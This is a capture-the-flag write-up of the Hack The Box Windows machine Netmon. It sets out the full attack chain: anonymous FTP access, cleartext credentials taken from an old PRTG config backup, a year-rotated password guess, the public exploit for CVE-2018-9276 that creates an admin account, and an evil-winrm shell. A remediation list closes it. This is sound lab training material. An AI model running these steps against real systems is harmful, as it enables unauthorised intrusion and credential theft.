# HTB — Netmon

> **OS:** Windows · **Difficulty:** Easy · **Status:** Rooted
> **Themes:** anonymous FTP → config credential hunting → old backup leak → password rotation pattern → authenticated CVE (PRTG) → RCE as SYSTEM → evil-winrm

---

## 1. Recon

```bash
sudo nmap -p- --min-rate 1000 -sV <target>
```

| Port | Service | Notes |
|------|---------|-------|
| 21   | FTP (Microsoft ftpd) | **anonymous allowed** |
| 80   | HTTP | **Paessler PRTG Network Monitor 18.1.37.13946** |
| 135/139/445 | SMB / RPC | Windows Server 2008 R2 - 2012 |
| 5985 | WinRM | remote PowerShell |

Two leads: anonymous FTP (filesystem read) + an old PRTG version on 80 (likely CVE).

## 2. User flag — anonymous FTP

```bash
ftp <target>   # user: anonymous, blank password
# FTP is rooted at C:\  -> navigate to the Public/Administrator desktop
```
`user.txt` is readable directly over FTP (anonymous read of the drive).

**Lesson:** always test **anonymous FTP** (`anonymous` / blank). If allowed and rooted at `C:\`, you can read the whole filesystem without creds.

## 3. Credential hunting — PRTG config files

PRTG is the root vector, but its web panel needs creds. PRTG stores config (with saved credentials) on disk — reachable via the anonymous FTP.

**Where to look** (Windows app convention): `C:\ProgramData\<Vendor>\...`
```
C:\ProgramData\Paessler\PRTG Network Monitor\
```
> `ProgramData` is **hidden** → doesn't show in `dir`/`ls`, but `cd` into it by name. Found via Windows convention + Googling "PRTG configuration file location".

Files present:
- `PRTG Configuration.dat` → current config, `<dbpassword>` is `<encrypted/>` (dead end)
- `PRTG Configuration.old.bak` → **old backup, pre-encryption → cleartext**

```bash
get "PRTG Configuration.old.bak"
grep -i -A2 "dbpassword" "PRTG Configuration.old.bak"
```
Result:
```
<!-- User: prtgadmin -->
PrTg@dmin2018
```

**Lesson:** hunt credentials in config files, especially **old backups** (`.old`, `.bak`) — they often predate encryption and store secrets in cleartext. `grep` big files instead of reading by eye.

## 4. The password-rotation trick

The backup is from **2018** and the password is `PrTg@dmin**2018**` (password + year = weak pattern). Admins "rotate" by bumping the year. The live password was **`PrTg@dmin2019`**.

- Login to PRTG web (`http://<target>`) as `prtgadmin : PrTg@dmin2019` → success.

## 5. Root — authenticated RCE (CVE-2018-9276)

PRTG < 18.2.39 is vulnerable. PRTG **notifications** run a program whose parameter field is passed to PowerShell without sanitization → **command injection**, executed as the PRTG service = **SYSTEM**.

```bash
searchsploit PRTG
searchsploit -m windows/webapps/46527.sh   # (Authenticated) RCE
```
The exploit needs the authenticated session cookie (`OCTOPUS...`). The PRTG session cookie is **HttpOnly** → `document.cookie` can't read it; grab it from **DevTools → Storage → Cookies**.

```bash
bash 46527.sh -u http://<target> -c "OCTOPUS1813713946=<value>"
# -> creates local admin: pentest : P3nT3st!
```

## 6. Shell — evil-winrm (port 5985)

```bash
evil-winrm -i <target> -u pentest -p 'P3nT3st!'
# *Evil-WinRM* PS> type C:\Users\Administrator\Desktop\root.txt
```
WinRM = "SSH of Windows"; evil-winrm opens a PowerShell session with valid creds. `pentest` is admin → read `root.txt`.

## 7. Remediation (for the report)
- Disable anonymous FTP; don't serve the filesystem root.
- Never store cleartext credentials in config/backups; restrict and encrypt backups.
- Don't reuse rotate-by-year passwords; enforce strong unique passwords.
- Patch PRTG (CVE-2018-9276); run the service with least privilege, not SYSTEM.

## 8. Kill chain
`nmap → anon FTP (user.txt) → C:\ProgramData\Paessler config → .old.bak cleartext creds → year+1 → PRTG login → CVE-2018-9276 (cookie, auth RCE) → admin pentest:P3nT3st! → evil-winrm (5985) → root`
